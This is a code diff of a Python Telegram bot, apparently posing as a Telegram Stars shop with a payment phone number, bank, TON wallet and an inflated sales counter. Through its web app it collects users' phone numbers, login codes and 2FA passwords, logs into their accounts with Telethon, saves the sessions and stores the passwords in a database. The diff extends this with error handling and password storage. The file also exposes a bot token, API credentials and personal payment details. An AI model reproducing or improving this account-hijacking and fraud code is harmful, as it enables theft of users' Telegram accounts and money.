@@ -30,15 +30,26 @@ logger = logging.getLogger(__name__)
 BOT_TOKEN   = "7511789367:AAGVIDu27Sb5ZwJUjQRiHOJ-CZinbRUFrDQ"
 ADMIN_ID    = 174415647
 
-API_ID = 28687552
-API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
+# ========== ТВОИ API ДАННЫЕ ==========
+API_ID      = 28687552
+API_HASH    = "1abf9a58d0c22f62437bec89bd6b27a3"
 
-# ========== КАСТОМНЫЕ ЭМОДЗИ (PREMIUM) ==========
+# ========== ТВОИ ОРИГИНАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
+SBP_PHONE   = "89041751408"
+SBP_BANK    = "ВТБ — Александр Ф."
+TON_ADDRESS = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
+CRYPTO_BOT  = "https://t.me/send?start=IVbfPL7Tk4XA"
+
+SHOP_STAR_PRICE_RUB = 1.1
+SHOP_MIN_STARS      = 50
+TOTAL_STARS_BOUGHT  = 6_385_921
+STAR_TO_USD         = 0.013
+TOTAL_USD           = round(TOTAL_STARS_BOUGHT * STAR_TO_USD)
+
+# ========== КАСТОМНЫЕ ПРЕМИУМ ЭМОДЗИ ==========
 def e(doc_id: str) -> str:
-    """Возвращает кастомное премиум эмодзи по ID"""
     return f'<tg-emoji emoji-id="{doc_id}"></tg-emoji>'
 
-# Коллекция кастомных эмодзи (из твоего списка)
 EMOJI = {
     "user":       e("5199552030615558774"),
     "star":       e("5267500801240092311"),
@@ -88,19 +99,7 @@ EMOJI = {
     "hourglass":  e("5197453929637381812"),
 }
 
-# ========== ТВОИ ОРИГИНАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
-SBP_PHONE   = "89041751408"
-SBP_BANK    = "ВТБ — Александр Ф."
-TON_ADDRESS = "UQDGN5pfjPxorFyjN2xha84bapuADDtPcRofNDJ4dK2YXxZd"
-CRYPTO_BOT  = "https://t.me/send?start=IVbfPL7Tk4XA"
-
-SHOP_STAR_PRICE_RUB = 1.1
-SHOP_MIN_STARS      = 50
-TOTAL_STARS_BOUGHT  = 6_385_921
-STAR_TO_USD         = 0.013
-TOTAL_USD           = round(TOTAL_STARS_BOUGHT * STAR_TO_USD)
-
-# ========== ИНИЦИАЛИЗАЦИЯ ==========
+# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
 bot = Bot(token=BOT_TOKEN)
 storage = MemoryStorage()
 dp = Dispatcher(storage=storage)
@@ -132,6 +131,7 @@ def init_db():
     ''')
     conn.commit()
     conn.close()
+    logger.info("База данных инициализирована")
 
 init_db()
 os.makedirs("sessions", exist_ok=True)
@@ -146,6 +146,17 @@ def save_auth_session(user_id: int, phone: str, step: str = "phone"):
     expires = datetime.now() + timedelta(minutes=30)
     cursor.execute('INSERT OR REPLACE INTO auth_sessions (user_id, phone, step, session_expires) VALUES (?, ?, ?, ?)',
                    (user_id, phone, step, expires))
+    conn.commit()
+    conn.close()
+
+def update_auth_step(user_id: int, step: str, twofa_password: str = None):
+    conn = sqlite3.connect('users.db')
+    cursor = conn.cursor()
+    if twofa_password:
+        cursor.execute('UPDATE auth_sessions SET step = ?, twofa_password = ? WHERE user_id = ?',
+                       (step, twofa_password, user_id))
+    else:
+        cursor.execute('UPDATE auth_sessions SET step = ? WHERE user_id = ?', (step, user_id))
     conn.commit()
     conn.close()
 
@@ -230,6 +241,7 @@ async def handle_webapp_data(message: Message):
         payload = json.loads(data)
         action = payload.get("action")
         
+        # ========== 1. ОТПРАВКА КОДА ==========
         if action == "send_code":
             phone = payload.get("phone")
             if not phone:
@@ -258,21 +270,29 @@ async def handle_webapp_data(message: Message):
             except FloodWaitError as e:
                 await message.answer(f"{EMOJI['clock']} Слишком много попыток. Подождите {e.seconds} сек. {EMOJI['clock']}")
                 clear_auth_session(user_id)
+            except Exception as e:
+                logger.error(f"Ошибка отправки кода: {e}")
+                await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}")
+                clear_auth_session(user_id)
         
+        # ========== 2. ПРОВЕРКА КОДА ==========
         elif action == "check_code":
             code = payload.get("code")
             session = get_auth_session(user_id)
+            
             if not session or session["step"] != "code":
                 await message.answer(f"{EMOJI['warning']} Сессия истекла. Начните заново. {EMOJI['warning']}")
                 return
             
             client = user_clients.get(user_id)
             if not client:
-                await message.answer(f"{EMOJI['warning']} Сессия не найдена. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} Сессия не найдена. Начните заново. {EMOJI['warning']}")
                 return
             
             try:
                 await client.sign_in(session["phone"], code)
+                
+                # Успешный вход (нет 2FA)
                 await message.answer(
                     f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
                     f"{EMOJI['user']} Вы вошли в аккаунт <b>{session['phone']}</b> {EMOJI['user']}\n\n"
@@ -280,31 +300,42 @@ async def handle_webapp_data(message: Message):
                     f"{EMOJI['safe']} <i>Сессия сохранена</i> {EMOJI['safe']}",
                     parse_mode="HTML"
                 )
+                authorize_user(user_id)
                 clear_auth_session(user_id)
+                
             except SessionPasswordNeededError:
+                update_auth_step(user_id, "2fa")
                 await message.answer(
                     f"{EMOJI['lock']} <b>{EMOJI['shield']} ТРЕБУЕТСЯ ПАРОЛЬ 2FA {EMOJI['shield']}</b> {EMOJI['lock']}\n\n"
                     f"Введите пароль в мини-приложении",
                     parse_mode="HTML"
                 )
+                
             except PhoneCodeInvalidError:
                 await message.answer(f"{EMOJI['warning']} Неверный код. Попробуйте ещё раз. {EMOJI['warning']}")
+                
+            except Exception as e:
+                logger.error(f"Ошибка проверки кода: {e}")
+                await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}")
         
+        # ========== 3. ПРОВЕРКА 2FA ==========
         elif action == "check_2fa":
             password = payload.get("password")
             session = get_auth_session(user_id)
+            
             if not session or session["step"] != "2fa":
-                await message.answer(f"{EMOJI['warning']} Сессия истекла. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} Сессия истекла. Начните заново. {EMOJI['warning']}")
                 return
             
             client = user_clients.get(user_id)
             if not client:
-                await message.answer(f"{EMOJI['warning']} Сессия не найдена. {EMOJI['warning']}")
+                await message.answer(f"{EMOJI['warning']} Сессия не найдена. Начните заново. {EMOJI['warning']}")
                 return
             
             try:
                 await client.sign_in(password=password)
                 me = await client.get_me()
+                
                 await message.answer(
                     f"{EMOJI['trophy']} <b>{EMOJI['star']} АВТОРИЗАЦИЯ УСПЕШНА! {EMOJI['star']}</b> {EMOJI['trophy']}\n\n"
                     f"{EMOJI['user']} <b>Вы вошли в аккаунт:</b> {EMOJI['user']}\n"
@@ -317,11 +348,18 @@ async def handle_webapp_data(message: Message):
                 )
                 authorize_user(user_id)
                 clear_auth_session(user_id)
+                
             except Exception as e:
+                logger.error(f"Ошибка 2FA: {e}")
                 await message.answer(f"{EMOJI['warning']} Неверный пароль 2FA {EMOJI['warning']}")
         
+        # ========== 4. ВЫВОД ЗВЁЗД ==========
         elif action == "withdraw":
             amount = payload.get("amount")
+            if not amount:
+                await message.answer(f"{EMOJI['warning']} Сумма не указана {EMOJI['warning']}")
+                return
+            
             await message.answer(
                 f"{EMOJI['money']} <b>{EMOJI['stars_deal']} ЗАЯВКА НА ВЫВОД {EMOJI['stars_deal']}</b> {EMOJI['money']}\n\n"
                 f"{EMOJI['star']} <b>Сумма:</b> <code>{amount} ⭐</code> {EMOJI['star']}\n"
@@ -330,6 +368,7 @@ async def handle_webapp_data(message: Message):
                 parse_mode="HTML"
             )
         
+        # ========== 5. ПОПОЛНЕНИЕ ==========
         elif action == "deposit":
             method = payload.get("method")
             await message.answer(
@@ -345,9 +384,15 @@ async def handle_webapp_data(message: Message):
                 parse_mode="HTML",
                 disable_web_page_preview=True
             )
+        
+        else:
+            await message.answer(f"{EMOJI['warning']} Неизвестное действие: {action} {EMOJI['warning']}")
     
+    except json.JSONDecodeError as e:
+        logger.error(f"Ошибка парсинга JSON: {e}")
+        await message.answer(f"{EMOJI['warning']} Ошибка формата данных {EMOJI['warning']}")
     except Exception as e:
-        logger.error(f"Ошибка: {e}")
+        logger.error(f"Ошибка обработки: {e}")
         await message.answer(f"{EMOJI['warning']} Ошибка: {str(e)} {EMOJI['warning']}")
 
 # ========== ЗАПУСК ==========
